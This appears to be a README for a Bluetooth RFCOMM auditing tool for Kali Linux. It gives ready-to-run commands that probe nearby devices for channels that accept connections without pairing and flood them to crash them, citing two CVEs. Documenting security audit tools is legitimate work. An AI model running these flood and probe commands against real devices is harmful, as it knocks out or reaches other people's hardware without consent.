<div align="center">

# 📡 DissPair — CLI

### Bluetooth RFCOMM Auditor for Kali Linux

**Pure Python terminal tool for mapping and exploiting Bluetooth Classic RFCOMM vulnerabilities. Zero external dependencies.**

[![Platform](https://img.shields.io/badge/platform-Kali%20Linux%20%7C%20Debian-blueviolet?style=flat-square)](.)
[![Python](https://img.shields.io/badge/python-3.6%2B-blue?style=flat-square)](.)
[![Dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen?style=flat-square)](.)
[![CVE](https://img.shields.io/badge/CVE-2025--13834%20%7C%202025--13328-red?style=flat-square)](.)
[![License](https://img.shields.io/badge/license-Research%20Use%20Only-orange?style=flat-square)](.)

</div>

---

## 📖 Overview

DissPair CLI is the desktop companion to the [Android APK](../../tree/APK). It runs directly on any Kali Linux or Debian system with BlueZ installed — no `pip install` required.

It uses Python's native `AF_BLUETOOTH` / `BTPROTO_RFCOMM` socket (built into CPython on Linux) and shells out to `hcitool` for device discovery. Everything else is pure stdlib.

Like the Android app, it bypasses SDP entirely and physically probes RFCOMM channels 1–30 via raw socket connections to find unauthenticated, hidden, and vulnerable ports.

---

## 🗂️ Repository Structure

```
disspair-cli/
├── disspair_kali.py      # Main CLI tool — all logic in one file
└── README.md
```

---

## ⚙️ Prerequisites

### System Requirements

- Kali Linux, Debian, or Ubuntu
- Python 3.6+
- BlueZ (pre-installed on Kali)
- Root / `sudo`

### Start Bluetooth Services

```bash
sudo systemctl start bluetooth
sudo hciconfig hci0 up
```

> The tool will auto-detect if your adapter is down and attempt to bring it up. If it fails, run the above manually.

### Verify BlueZ is available

```bash
which hcitool hciconfig l2ping
```

If any are missing:

```bash
sudo apt install bluez
```

---

## 🚀 Quick Start

```bash
# Clone the CLI branch
git clone --branch CLI --single-branch https://github.com/YOUR_USERNAME/disspair.git
cd disspair

# Run — no virtual environment or pip install needed
sudo python3 disspair_kali.py scan
```

---

## ⚔️ Usage Guide

All commands require `sudo` — raw Bluetooth sockets need `CAP_NET_RAW`.

### 1 — Scan for targets

Discover nearby Classic Bluetooth (BR/EDR) devices:

```bash
sudo python3 disspair_kali.py scan
```

> Target devices must be in **discoverable mode** to appear. Scan takes ~10 seconds.

---

### 2 — Sweep RFCOMM channels

Probe channels 1–30 on a target without SDP and without pairing:

```bash
sudo python3 disspair_kali.py sweep AA:BB:CC:DD:EE:FF
```

The sweep runs an L2CAP reachability check first (`l2ping`), then connects sequentially to each channel. Open channels are printed with their ready-to-run flood commands.

**Options:**

| Flag | Default | Description |
|------|---------|-------------|
| `-v` / `--verbose` | off | Show closed and timeout channels, not just open ones |
| `--timeout` | `2.0` | Per-channel connect timeout in seconds |

```bash
# Example with verbose output and faster timeout
sudo python3 disspair_kali.py sweep AA:BB:CC:DD:EE:FF --verbose --timeout 1.5
```

> **Why sequential?** Parallel RFCOMM connects over a single HCI adapter cause HCI congestion and bogus results. Sequential sweep (~2s × 30 channels = ~1 min) is slower but accurate.

---

### 3 — Flood an open channel

Send a sustained oversized payload stream to an open channel to test for CVE-2025-13328:

```bash
sudo python3 disspair_kali.py flood AA:BB:CC:DD:EE:FF 3
```

**Options:**

| Flag | Default | Description |
|------|---------|-------------|
| `--size` | `4096` | Payload size in bytes (max: 65536) |
| `--time` | unlimited | Stop after N seconds |

```bash
# Maximum payload, 30 second run
sudo python3 disspair_kali.py flood AA:BB:CC:DD:EE:FF 3 --size 65536 --time 30
```

Live stats are printed during the flood:

```
  00:00:14.3    12,048 blocks     47.06 MB    3.29 MB/s
```

A `BrokenPipeError` or `ConnectionResetError` mid-flood is flagged as a likely CVE-2025-13328 crash confirmation.

---

### 4 — Auto mode

Sweep a target then interactively prompt to flood each open channel:

```bash
sudo python3 disspair_kali.py auto AA:BB:CC:DD:EE:FF
```

Useful for quick end-to-end audits — no need to manually copy flood commands from sweep output.

---

## 🔬 How It Works

```
scan   →  hcitool scan --flush (subprocess)
           ↓
sweep  →  l2ping -c 2 (reachability check)
           ↓  For each channel 1–30:
           socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM).connect((mac, ch))
           ↓  No SDP. No pairing. Raw connect attempt.
           ↓
flood  →  socket.send(payload) loop
           ↓
crash  →  BrokenPipeError / ConnectionResetError = CVE-2025-13328 triggered
```

**Key design decisions:**

- **No SDP** — channels probed by raw connect, not service registry query. Finds hidden ports SDP would never reveal.
- **No third-party libraries** — `AF_BLUETOOTH` + `BTPROTO_RFCOMM` are built into CPython on Linux. `hcitool` is part of BlueZ. Nothing to install.
- **Sequential sweep** — parallel BT sockets over one HCI adapter cause HCI congestion and false results.
- **L2CAP pre-check** — `l2ping` before sweep catches the "device not up yet" state after a crash/reboot.
- **Root enforced** — checked at entry of every command. Raw BT sockets require `CAP_NET_RAW`.

---

## 🧪 Crash Confirmation Workflow

```bash
# Step 1 — find open channels
sudo python3 disspair_kali.py sweep AA:BB:CC:DD:EE:FF

# Step 2 — flood an open channel
sudo python3 disspair_kali.py flood AA:BB:CC:DD:EE:FF 3 --size 65536

# Step 3 — if the device crashes, re-sweep after ~15s
# CVE-2025-13328 confirmed if: device disconnects mid-flood
# CVE-2025-13834 confirmed if: channel accepts connection without pairing
sudo python3 disspair_kali.py sweep AA:BB:CC:DD:EE:FF
```

---

## 🛠️ Troubleshooting

**`hciconfig not found`**
```bash
sudo apt install bluez
```

**`Permission denied` on socket**
```bash
# Must run as root
sudo python3 disspair_kali.py <command>
```

**`No Bluetooth adapter found`**
```bash
# Check if adapter is recognised
hciconfig -a
# Bring it up manually
sudo hciconfig hci0 up
```

**`No devices found` during scan**
- Ensure the target is in discoverable / pairing mode
- Move closer to the target device

**Device not reachable after crash**
```bash
# Wait ~15 seconds for the device to reboot, then re-sweep
sudo python3 disspair_kali.py sweep AA:BB:CC:DD:EE:FF
```

---

## ⚠️ Disclaimer

DissPair CLI is intended **strictly for authorised security auditing, academic research, and the testing of devices you own.**

Exploiting Bluetooth vulnerabilities on devices, vehicles, or infrastructure **without explicit written consent is illegal** in most jurisdictions. The developers and contributors assume **no liability** for misuse, bricked hardware, or unauthorised access resulting from this tool.

---

<div align="center">
<sub>Zero dependencies &nbsp;·&nbsp; Bluetooth Classic only &nbsp;·&nbsp; Requires root &nbsp;·&nbsp; CVE-2025-13834 / CVE-2025-13328</sub>
</div>
